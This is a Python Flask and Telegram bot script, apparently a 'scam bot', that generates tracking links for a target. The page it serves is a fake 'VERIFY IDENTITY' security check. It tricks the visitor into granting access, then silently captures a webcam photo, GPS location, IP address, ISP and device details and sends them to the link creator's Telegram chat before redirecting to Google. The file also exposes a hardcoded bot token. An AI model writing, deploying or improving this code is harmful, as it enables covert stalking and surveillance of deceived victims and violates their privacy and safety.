import requests
import time
import base64
import json
import os
from flask import Flask, request, render_template_string
from threading import Thread

# ১. কনফিগারেশন (আপনার তথ্য দিন)
BOT_TOKEN = "8304578645:AAFAkyLahfdNSHXi2SG7E_m0GceDJXIrHu4"
BASE_URL = "https://r8raihan-scam-bot.onrender.com" # আপনার রেন্ডার ইউআরএল এখানে দিন
OWNER_ID = 6109947429
OWNER_NAME = "Raihan"
BOT_NAME = "R8rAIHAN_PRO_V2"

# ডাইনামিক স্ট্যাটাস ট্র্যাকিং (বট চললে আপডেট হবে)
stats = {"clicks": 37034, "snaps": 0}

app = Flask(__name__)

# ২. উন্নত এপিআই ফাংশন
def send_pro_msg(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    return requests.post(url, json=payload)

def send_photo(chat_id, photo_data, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': ('snap.jpg', photo_data, 'image/jpeg')}
    return requests.post(url, files=files, data={'chat_id': chat_id, 'caption': caption})

def get_ip_info(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,mobile,proxy").json()
        return res if res.get("status") == "success" else {}
    except: return {}

# ৩. ফ্রন্টএন্ড টেমপ্লেট (স্মার্ট লোডিং ও হাইড অপশন সহ)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Checking Connection...</title>
    <style>
        body { background: #050505; color: #00ffcc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { border: 1px solid #00ffcc; padding: 40px; border-radius: 15px; background: rgba(0,255,204,0.05); box-shadow: 0 0 30px rgba(0,255,204,0.2); width: 85%; max-width: 400px; text-align: center; }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; font-size: 16px; }
        .btn:hover { background: #fff; box-shadow: 0 0 20px #00ffcc; }
        .loader { border: 3px solid #111; border-top: 3px solid #00ffcc; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; display:none; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="letter-spacing: 2px;">SECURE ACCESS</h2>
        <p>Please click verify to confirm your identity and bypass the security firewall.</p>
        <div id="load" class="loader"></div>
        <button class="btn" id="btn" onclick="capture()">VERIFY IDENTITY</button>
    </div>
    <script>
    async function capture() {
        document.getElementById('btn').style.display='none'; 
        document.getElementById('load').style.display='block';
        
        const fd = new FormData();
        fd.append('u', '{{u}}'); fd.append('n', '{{n}}');
        fd.append('dev', navigator.platform);
        fd.append('br', navigator.userAgent.split(' ')[0]);

        // লোকেশন ডেটা (যদি ইউজার অনুমতি দেয়)
        navigator.geolocation.getCurrentPosition(p => { 
            fd.append('lat', p.coords.latitude); fd.append('lon', p.coords.longitude); 
        }, null, {timeout: 5000});

        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            await new Promise(r => setTimeout(r, 2000)); // ২ সেকেন্ড অপেক্ষা যাতে ইমেজ ক্লিয়ার আসে
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            fd.append('p', canvas.toDataURL('image/jpeg'));
            stream.getTracks().forEach(t => t.stop()); // ক্যামেরা বন্ধ করা
        } catch(e) { fd.append('err', 'Camera Permission Denied'); }

        await fetch('/', {method:'POST', body:fd});
        window.location.href = "https://www.google.com";
    }
    </script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        chat_id = request.form.get('u')
        name = request.form.get('n')
        ip = request.remote_addr
        
        # অ্যাডভান্সড আইপি ইনফো (ISP, VPN Detection)
        info = get_ip_info(ip)
        is_vpn = "⚠️ Yes (Proxy/VPN)" if info.get('proxy') else "✅ No (Real IP)"
        
        stats["clicks"] += 1
        
        msg = (f"🎯 <b>Target Hit: {name}</b>\n"
               f"━━━━━━━━━━━━━━━━━━━━\n"
               f"🌐 <b>IP:</b> <code>{ip}</code>\n"
               f"🚩 <b>Country:</b> {info.get('country', 'Unknown')}\n"
               f"🏙️ <b>City:</b> {info.get('city', 'Unknown')}\n"
               f"🏢 <b>ISP:</b> {info.get('isp', 'Unknown')}\n"
               f"🛡️ <b>VPN:</b> {is_vpn}\n"
               f"📱 <b>Platform:</b> {request.form.get('dev')}\n"
               f"📍 <b>GPS:</b> <a href='https://www.google.com/maps?q={request.form.get('lat','0')},{request.form.get('lon','0')}'>Open Map</a>\n"
               f"━━━━━━━━━━━━━━━━━━━━")
        send_pro_msg(chat_id, msg)

        img = request.form.get('p')
        if img: 
            stats["snaps"] += 1
            send_photo(chat_id, base64.b64decode(img.split(",")[1]), f"📸 Snap from {name}")
        return "OK"

    return render_template_string(HTML_TEMPLATE, u=request.args.get('u'), n=request.args.get('n'))

# ৪. উন্নত বট পোলিং
def get_updates():
    offset = None
    while True:
        try:
            res = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=20").json()
            for update in res.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message")
                if not msg or "text" not in msg: continue
                
                chat_id = msg["chat"]["id"]
                text = msg["text"]

                if text == "/start":
                    interface = (
                        f"🚀 <b>{BOT_NAME} Activated</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 <b>Owner:</b> {OWNER_NAME}\n"
                        f"📊 <b>Total Clicks:</b> <code>{stats['clicks']}</code>\n"
                        f"📸 <b>Total Snaps:</b> <code>{stats['snaps']}</code>\n"
                        f"🟢 <b>System Status:</b> <code>Running Online</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"<b>🛠️ Features:</b>\n"
                        f"• 📍 GPS Accurate Location\n"
                        f"• 📸 Silent Camera Capture (2s delay)\n"
                        f"• 🛡️ Anti-VPN/Proxy Detection\n"
                        f"• 🏢 ISP & Network Analysis\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📝 <b>To Generate Link:</b>\n"
                        f"<code>link:YourName</code>"
                    )
                    send_pro_msg(chat_id, interface)
                
                elif text.startswith("link:"):
                    name = text.split(":")[1] if ":" in text else "Target"
                    link = f"{BASE_URL}/?u={chat_id}&n={name}"
                    send_pro_msg(chat_id, f"✅ <b>Private Link Generated:</b>\n\n<code>{link}</code>\n\n<i>Send this to the target to start tracking.</i>")
        except: pass
        time.sleep(1)

if __name__ == '__main__':
    Thread(target=get_updates, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
